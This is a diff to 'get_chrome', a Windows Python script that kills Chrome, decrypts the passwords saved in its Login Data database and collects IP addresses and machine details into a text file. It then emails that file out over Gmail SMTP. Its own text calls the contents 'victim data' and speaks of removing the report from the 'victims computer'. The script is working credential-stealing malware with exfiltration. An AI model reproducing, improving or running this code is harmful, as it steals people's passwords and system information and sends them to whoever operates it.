@@ -1,6 +1,7 @@
-## madeby parad0x 20/10/19 8:48pm ##
+## made by parad0x 20/10/19 8:48pm ##
 ## WINDOWS ONLY ## // supports all
-
+print("You're in control of everything.\n")
+Changelog = "Latest Update: \nThursday 9th January 2020\nManually import Email Data\nGets advanced PC information\nEntirely accessable, everything that's happening is displayed.\nTuesday, 14/01/2020:\nget_chrome is now entirely a UI based console, everything that goes on is beneath your eyes!"
 #imports
 import os
 import time
@@ -16,13 +17,18 @@ import sqlite3
 import win32crypt
 import platform
 import sys
+import platform
+import psutil
+import uuid
+import getpass
 
 # kills all browser services(this script works only on chrome, as of right now.)
 def kill_browsers():
 	## kill browsers ##
 	browserExe = "chrome.exe"
 	os.system("taskkill /f /im "+browserExe)
-	os.system("cls")
+	#clear messages
+	#os.system("cls")
 	# kills chrome // OTHER BROWSERS ARE BLANKED OUT UNTIL WE RELEASE A STABLE RELEASE OF THEM //
 	#os.system("taskkill /f /im "+browserExe)
 	#os.system("cls")
@@ -45,6 +51,7 @@ def kill_browsers():
 	# clears console, making it invisible to user that we killed browser's process
 	#os.system("cls")
 
+print("Writing Variables")
 # gather user info
 program_name = 'get_chrome.py'
 datetime = time.ctime(time.time())
@@ -52,32 +59,45 @@ user = os.path.expanduser('~').split('\\')[2]
 publicIP = requests.get('https://api.ipify.org/').text
 privateIP = socket.gethostbyname(socket.gethostname())
 OS = platform.system()
-
-old_app = ''
-
+FQDN = socket.getfqdn()
+Machine = platform.machine()
+Node = platform.node()
+Processor = platform.processor()
+Release = platform.release()
+Version = platform.version()
+NOC = psutil.cpu_count()
 welcome = 'Welcome ' + user + ' to ' + program_name + '!'
+owner = '\nThis program was made by Parad0xxxx and Snavellet!'
+warning = '\nThis program was intended for Developer Usage. Use with caution. If you choose to disobey these directions, you are at jeopardy!\n\n'
+old_app = ''
+filename = 'get_chrome.txt'
+print("Variables Written")
 
 # sees if the OS is windows, if so - continue. If not - exits.
 if (OS == "Windows"):
-	print(welcome)
+	print(welcome, owner)
+	print("Your OS is supported")
 	pass # Continues script
 else: # Exits the script with a message
 	print(OS + " is incompatible :(\nThis program only supports Windows systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
 	time.sleep(10)
 	exit()
-time.sleep(5)
 
 
-def get_bytes():
+def text_file():
+	print("Locating Chrome directory")
 	# directs to Chrome directory
 	data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
+	print("Directory found")
 	c = sqlite3.connect(data_path)
 	cursor = c.cursor()
+	print("Finding and writing Login Details")
 	select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
 	# checks to see if database is locked	
 	cursor.execute(select_statement) # if you're given "database is locked" (which you wont, because # kill chrome does that for you automatically.
 	# fetches all chrome tables from database
 	login_data = cursor.fetchall()
+	print("Login Details found")
 
 	#credential dictionary		
 	cred = {}
@@ -85,55 +105,66 @@ def get_bytes():
 		# empty string for data
 	string = ''
 
+	# adds a message from the Developers
+	string += '#### This program was made by Parad0xxxx and Snavellet!####\nPlease support the project:\nhttps://github.com/parad0xxxx/get_chrome/\n\n'
 	# displays current window opened as they ran the script
 	string += 'Window: ' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n'
 	# writes user data to .txt file
-	string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n'
+	string += 'Date/Time: ' + datetime + '\nUsername: ' + user + '\nPublic IP: ' + publicIP + '\n' + 'Private IP: ' + privateIP + '\n'
+	# get PC Advanced PC info
+	string += 'PC Info: ' + 'Machine: ' + Machine + '\n' + 'FQDN: ' + FQDN + 'Node: ' + Node + '\n' + 'Release: ' + Release + '\n' + 'Version: ' + Version + '\n'
+	# get Processor Info
+	string += 'Processor Info: ' + Processor + '\n'
+	# get CPU info
+	string += 'CPU Count: ' + str(NOC) + '\n'
 
 	# writing passwords to a .txt file
 	for url, user_name, pwd in login_data:
 	  	pwd = win32crypt.CryptUnprotectData(pwd)
 	  	cred[url] = (user_name, pwd[1].decode('utf8'))
 	  	string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
-	  	with open('report.txt', 'w') as fp:
+	  	with open('get_chrome.txt', 'w') as fp:
 	  		fp.write(string)
 
 # sends .txt as an attachment, to your email
 def send_stuff():
-	email_from = 'YOUREMAIL@gmail.com'
-	password = 'YOURPASSWORD'
-	email_to = 'RECEIVERADDRESS@gmail.com'
+	email_from = input("Enter your Email Address: ")
+	password = getpass.getpass("Enter your Email Address password: ")
+	email_to = input("Enter receiver Email Address: ")
 	subject = 'get_chrome RESULTS'
+	print('Sending Email to ' + email_to + ' from ' + email_from)
 	msg = MIMEMultipart()
 	msg['From'] = email_from
 	msg['To'] = email_to
 	msg['Subject'] = subject
-
 	body = "Hi there!\nI see you've made it this far with get_chrome.\nPlease follow the instructions below.\n• Our latest update has allowed us to send the proper text format file.\n• Open the .txt file to retrieve victim data.\nThanks for using get_chrome\n[!] Please star our project: https://github.com/parad0xxxx/get_chrome\n[!] Follow me on GitHub: https://github.com/parad0xxxx\nCreator: ~ parad0x & snavellet"
 	msg.attach(MIMEText(body,'plain'))
-
-	filename='report.txt'
+	filename='get_chrome.txt'
 	attachment =open(filename,'rb')
-
 	part = MIMEBase('application', 'octet-stream')
 	part.set_payload((attachment).read())
 	encoders.encode_base64(part)
 	part.add_header('Content-Disposition',"attachment; filename= " + filename)
-
 	msg.attach(part)
 	text = msg.as_string()
 	server = smtplib.SMTP('smtp.gmail.com',587)
 	server.starttls()
 	server.login(email_from,password)
-
 	server.sendmail(email_from,email_to,text)
+	print('Email Sent!')
 
 # runs every event
 if __name__ == '__main__':
+	import click
 	kill_browsers()
-	get_bytes()
+	text_file()	
 	send_stuff()
-	# removes .txt file from victims computer
-	os.remove('report.txt')
-	print("You may now close the program")
-	time.sleep(60)
+	# prompts to keep or remove results
+	if click.confirm('Do you want to download the output text file?', default=True):
+		print('Results have been saved to ' + os.path.dirname(os.path.abspath(__file__)) + ' as ' + filename)
+		pass
+else:
+	os.remove('get_chrome.txt')
+
+print("You may now close the program")
+time.sleep(60)
